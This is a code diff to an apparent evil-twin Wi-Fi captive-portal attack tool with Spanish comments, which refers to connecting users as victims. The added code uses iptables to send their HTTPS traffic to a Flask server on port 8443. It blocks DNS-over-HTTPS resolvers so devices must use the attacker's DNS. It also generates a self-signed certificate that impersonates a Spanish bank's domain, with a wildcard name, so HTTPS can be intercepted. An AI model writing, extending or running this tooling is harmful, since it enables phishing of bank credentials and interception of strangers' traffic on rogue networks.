@@ -53,6 +53,7 @@ DHCP_START   = "10.0.0.10"
 DHCP_END     = "10.0.0.100"
 SUBNET_MASK  = "255.255.255.0"
 FLASK_PORT   = 80
+FLASK_SSL_PORT = 8443      # Puerto interno HTTPS de Flask (iptables redirige 443 → 8443)
 UPSTREAM_DNS = "8.8.8.8"   # DNS real para víctimas autenticadas
 
 
@@ -715,10 +716,11 @@ class CaptivePortal:
         self._dnsmasq_conf = "/tmp/wt_cp_dnsmasq.conf"
         self._dnsmasq_pid  = "/tmp/wt_cp_dnsmasq.pid"
 
-        self._hostapd_proc = None
-        self._dnsmasq_proc = None
-        self._flask_thread = None
-        self._sniffer      = None
+        self._hostapd_proc    = None
+        self._dnsmasq_proc    = None
+        self._flask_thread    = None
+        self._flask_ssl_thread = None
+        self._sniffer         = None
 
         self.on_started    = None
         self.on_stopped    = None
@@ -825,15 +827,29 @@ class CaptivePortal:
                         "-p", "udp", "--dport", "67", "-j", "ACCEPT"], capture_output=True)
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                         "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True)
+        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
+                        "-p", "tcp", "--dport", str(FLASK_SSL_PORT), "-j", "ACCEPT"], capture_output=True)
 
+        # HTTP → Flask HTTP
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "80",
                         "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_PORT)],
                        capture_output=True)
+        # HTTPS → Flask HTTPS interno (8443): asi Firefox/Chrome/moviles con HSTS llegan a Flask
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "443",
-                        "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_PORT)],
+                        "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_SSL_PORT)],
                        capture_output=True)
+
+        # Bloquear DNS-over-HTTPS (DoH) a servidores conocidos para forzar uso de dnsmasq
+        # Sin esto Android/iOS pueden ignorar el DNS del DHCP y resolver por su cuenta
+        for doh_ip in ("8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9"):
+            subprocess.run(["iptables", "-A", "FORWARD",
+                            "-p", "tcp", "-d", doh_ip, "--dport", "443", "-j", "DROP"],
+                           capture_output=True)
+            subprocess.run(["iptables", "-A", "FORWARD",
+                            "-p", "udp", "-d", doh_ip, "--dport", "853", "-j", "DROP"],
+                           capture_output=True)
 
         subprocess.run(["iptables", "-A", "FORWARD",
                         "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
@@ -841,7 +857,7 @@ class CaptivePortal:
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
 
-        self._log("iptables: modo portal (sin internet)")
+        self._log("iptables: modo portal (sin internet, HTTPS→8443, bloqueando DoH)")
 
     def _grant_internet(self, client_ip):
         iface  = self.interface
@@ -964,6 +980,9 @@ class CaptivePortal:
             self._err("No se pudo construir la app Flask.")
             return False
 
+        # Generar certificado SSL autofirmado para interceptar HTTPS
+        ssl_ctx = self._make_ssl_context()
+
         def run_flask():
             try:
                 import logging as _lg
@@ -971,12 +990,97 @@ class CaptivePortal:
                 app.run(host="0.0.0.0", port=FLASK_PORT,
                         threaded=True, use_reloader=False, debug=False)
             except Exception as ex:
-                self._err("Flask error: " + str(ex))
+                self._err("Flask HTTP error: " + str(ex))
+
+        def run_flask_ssl():
+            try:
+                import logging as _lg
+                _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
+                if ssl_ctx:
+                    app.run(host="0.0.0.0", port=FLASK_SSL_PORT,
+                            threaded=True, use_reloader=False, debug=False,
+                            ssl_context=ssl_ctx)
+                else:
+                    self._log("[!] SSL no disponible: solo HTTP activo")
+            except Exception as ex:
+                self._err("Flask HTTPS error: " + str(ex))
 
         self._flask_thread = threading.Thread(target=run_flask, daemon=True)
         self._flask_thread.start()
-        self._log("Flask portal en http://0.0.0.0:" + str(FLASK_PORT))
+        self._flask_ssl_thread = threading.Thread(target=run_flask_ssl, daemon=True)
+        self._flask_ssl_thread.start()
+        self._log("Flask HTTP  en http://0.0.0.0:" + str(FLASK_PORT))
+        self._log("Flask HTTPS en https://0.0.0.0:" + str(FLASK_SSL_PORT) + " (cert autofirmado)")
         return True
+
+    def _make_ssl_context(self):
+        """
+        Genera un certificado SSL autofirmado en memoria para interceptar HTTPS.
+        Usa cryptography si está disponible, si no intenta ssl_context='adhoc' (pyopenssl).
+        El navegador mostrará aviso de cert no confiable, pero el trafico llega a Flask.
+        """
+        # Intentar generar cert con cryptography (mas robusto)
+        try:
+            import datetime as _dt
+            import ipaddress
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+            import ssl, tempfile, os
+
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+            subject = issuer = x509.Name([
+                x509.NameAttribute(NameOID.COMMON_NAME, u"*.bbva.es"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"WireTrap"),
+            ])
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(subject)
+                .issuer_name(issuer)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(_dt.datetime.utcnow())
+                .not_valid_after(_dt.datetime.utcnow() + _dt.timedelta(days=365))
+                .add_extension(
+                    x509.SubjectAlternativeName([
+                        x509.DNSName(u"*"),
+                        x509.DNSName(u"*.local"),
+                        x509.IPAddress(ipaddress.IPv4Address(GATEWAY_IP)),
+                    ]),
+                    critical=False,
+                )
+                .sign(key, hashes.SHA256())
+            )
+            # Escribir a ficheros temporales
+            tmp_dir = "/tmp"
+            cert_path = os.path.join(tmp_dir, "wt_ssl.crt")
+            key_path  = os.path.join(tmp_dir, "wt_ssl.key")
+            with open(cert_path, "wb") as f:
+                f.write(cert.public_bytes(serialization.Encoding.PEM))
+            with open(key_path, "wb") as f:
+                f.write(key.private_bytes(
+                    serialization.Encoding.PEM,
+                    serialization.PrivateFormat.TraditionalOpenSSL,
+                    serialization.NoEncryption()
+                ))
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ctx.load_cert_chain(cert_path, key_path)
+            self._log("[SSL] Certificado autofirmado generado OK")
+            return ctx
+        except ImportError:
+            self._log("[SSL] cryptography no disponible, probando pyopenssl...")
+        except Exception as e:
+            self._log("[SSL] Error generando cert: " + str(e))
+
+        # Fallback: adhoc (requiere pyopenssl)
+        try:
+            import OpenSSL  # noqa
+            self._log("[SSL] Usando ssl_context='adhoc' (pyopenssl)")
+            return "adhoc"
+        except ImportError:
+            self._log("[!] Sin SSL: instala  pip3 install cryptography pyopenssl --break-system-packages")
+            return None
 
     def _start_sniffer(self):
         try:
